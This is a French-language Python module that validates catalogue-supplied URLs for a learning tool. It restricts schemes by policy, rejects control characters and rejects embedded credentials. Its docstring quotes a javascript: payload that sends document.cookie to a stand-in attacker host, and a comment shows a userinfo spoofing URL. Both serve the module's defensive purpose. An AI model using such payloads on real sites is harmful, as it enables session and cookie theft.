"""La politique des URL venant d'un catalogue, écrite une seule fois.

Une URL déclarée par un catalogue franchit une **frontière de confiance** :
`dsoxlab catalog add <url>` clone un dépôt git arbitraire, et ce dépôt décide
de ce que `doc_url`, `repo.issues_url` et bientôt `learning.portal_url`
contiennent. Ces valeurs sont des **données**, jamais des instructions.

Éprouvé avant d'être écrit, sur un catalogue d'essai monté pour l'occasion :

.. code-block:: yaml

    doc_url: "javascript:fetch('https://attaquant.test/'+document.cookie)"

``dsoxlab guide mauvais --print`` rendait cette valeur telle quelle, et sans
``--print`` elle atteignait ``webbrowser.open()``. ``validate-structure``
contrôle pourtant bien ce champ — mais il n'est ni automatique ni exigé avant
d'utiliser un catalogue, donc il ne constitue pas une barrière de sécurité. La
validation doit être rejouée **au point d'usage**.

Une seule implémentation, plusieurs politiques
==============================================

Les usages n'ont pas les mêmes exigences : un guide historique peut être en
``http``, un portail qui reçoit une preuve ne doit pas l'être. Cette divergence
est **déclarative** — un paramètre — et non obtenue par deux validateurs
différents, parce que deux validateurs finissent toujours par diverger et que
c'est le plus permissif qui décide.

Aucune sonde réseau
===================

Rien ici ne résout un nom, n'ouvre une connexion, ne suit une redirection. Un
contrôle de sécurité qui le ferait donnerait à un catalogue le pouvoir de faire
émettre des requêtes depuis le poste de l'apprenant ou depuis la CI — vers des
services internes, par exemple. ``validate-structure --check-urls`` reste un
contrôle réseau **volontaire et explicite**, qui est autre chose.
"""

from __future__ import annotations

from enum import Enum
from urllib.parse import urlparse, urlunparse


class PolitiqueURL(Enum):
    """Ce qu'un usage accepte comme schéma. Le reste des règles est commun."""

    DOCUMENTATION = ("http", "https")
    """Guides et pages d'issues. ``http`` reste accepté : des catalogues et des
    forges publient encore des URL en clair, et les refuser casserait des
    catalogues existants sans rien protéger de plus — la valeur est affichée,
    pas transmise avec un secret."""

    PORTAIL = ("https",)
    """Destination d'une preuve d'apprentissage. ``https`` seul : le lien
    portera des résultats, et une URL en clair les exposerait en chemin."""


class URLRefusee(ValueError):
    """Une URL de catalogue ne peut pas être affichée ni utilisée telle quelle.

    Porte une **clé** de traduction et ses paramètres, jamais une phrase : la
    commande qui l'attrape parle la langue de l'apprenant.
    """

    def __init__(self, champ: str, valeur: str, cle: str, **params: object) -> None:
        self.champ = champ
        self.valeur = valeur
        self.cle = cle
        self.params = params
        super().__init__(f"{champ}: {cle} {params}")


def _porte_un_caractere_de_controle(valeur: str) -> str | None:
    """Un ``\\r`` coupe une ligne, un ``\\x1b`` pilote le terminal.

    Ces caractères n'ont aucune raison d'être dans une URL, et ils en ont
    plusieurs de s'y trouver : injecter une ligne dans un journal, déplacer le
    curseur, repeindre ce que l'utilisateur croit lire.
    """
    for caractere in valeur:
        code = ord(caractere)
        if code < 0x20 or 0x7F <= code <= 0x9F:
            return caractere
    return None


def url_sure(
    valeur: str,
    *,
    champ: str,
    politique: PolitiqueURL = PolitiqueURL.DOCUMENTATION,
) -> str:
    """Rend l'URL normalisée si elle peut être affichée, lève sinon.

    Ce que « sûre » veut dire ici, et ce qu'il ne veut pas dire : la valeur est
    **syntaxiquement** acceptable et ne peut pas piloter autre chose qu'un
    navigateur. Elle n'est pas pour autant une destination approuvée — d'où la
    règle d'usage qui l'accompagne : une URL de catalogue s'affiche, et c'est
    l'utilisateur qui décide de l'ouvrir.
    """
    if not valeur:
        raise URLRefusee(champ, valeur, "securite_url_vide")

    fautif = _porte_un_caractere_de_controle(valeur)
    if fautif is not None:
        raise URLRefusee(
            champ, valeur, "securite_url_caractere", code=f"U+{ord(fautif):04X}"
        )

    try:
        parties = urlparse(valeur)
    except ValueError as exc:  # une IPv6 malformée, par exemple
        raise URLRefusee(champ, valeur, "securite_url_illisible") from exc

    if parties.scheme not in politique.value:
        # `javascript:`, `data:`, `file:`, `ssh:`, et tout gestionnaire de
        # protocole installé sur la machine : autant de manières de faire
        # agir le poste à partir d'une chaîne du catalogue.
        raise URLRefusee(
            champ, valeur, "securite_url_schema",
            scheme=parties.scheme or "—",
            allowed=", ".join(politique.value),
        )

    if not parties.hostname:
        raise URLRefusee(champ, valeur, "securite_url_sans_hote")

    if parties.username or parties.password:
        # `https://vrai-site.test@attaquant.test/` : l'œil lit le premier nom,
        # le navigateur va au second.
        raise URLRefusee(champ, valeur, "securite_url_identifiants")

    # Normalisée : c'est cette valeur qui sera affichée, pas la chaîne d'entrée.
    return urlunparse(parties)
